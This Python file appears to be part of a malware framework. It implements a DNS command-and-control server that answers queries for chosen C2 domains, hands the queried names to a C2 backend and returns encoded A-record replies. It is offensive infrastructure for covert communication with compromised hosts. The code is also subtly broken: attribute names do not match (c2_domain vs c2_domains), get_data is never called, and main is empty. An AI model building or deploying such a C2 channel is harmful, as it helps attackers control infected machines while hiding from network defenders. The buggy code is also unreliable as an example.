import logging
import traceback
import sys
from socketserver import BaseRequestHandler, ThreadingUDPServer

from dnslib import QTYPE, RR, A, DNSHeader, DNSRecord

from Alien import alien

logger = logging.getLogger("DNS_C2")

TTL = 86400

class DnsServer:
    def __init__(self, c2_server, c2_domains):
        self.c2_server = c2_server
        self.c2_domain = c2_domains
        self.memory = {}
    def process_query(self, data):
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qname = str(request.q.qname)

        if qname.endswith("."):
            qname = qname[:-1]

        if not any(domain in qname for domain in self.c2_domains):
            return None

        logger.debug(msg=f"[DNS] QUERY: {qname}")

        from_cache = True
        if qname not in self.memory.keys():
            try:
                from_cache = False
                self.memory[qname] = self.c2_server.parse_dns_request(qname)
            except Exception:
                traceback.print_exc(file=sys.stderr)

        response_string = self.memory[qname]
        if response_string is None:
            return None

        cache_string = " (cached)" if from_cache else ""

        logger.debug(
            msg=f"[DNS] RESPONSE: {response_string} {cache_string}"
        )

        a_record = A(response_string)
        reply.add_answer(
            RR(
                rname=qname,
                rtype=QTYPE.A,
                rclass=1,
                ttl=TTL,
                rdata=a_record,
            )
        )

        return reply.pack()
    

class UdpRequestHandler(BaseRequestHandler):
    def __init__(self, request, address, server, dns_server):
        self.dns_server = dns_server
        super().__init__(request, address, server)

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

    def handle(self):
        try:
            data = self.get_data
            response = self.dns_server.process_query(data)
            if response is not None:
                self.send_data(response)
        except Exception:
            pass

def main():
    pass

if __name__ == "__main__":
    main()
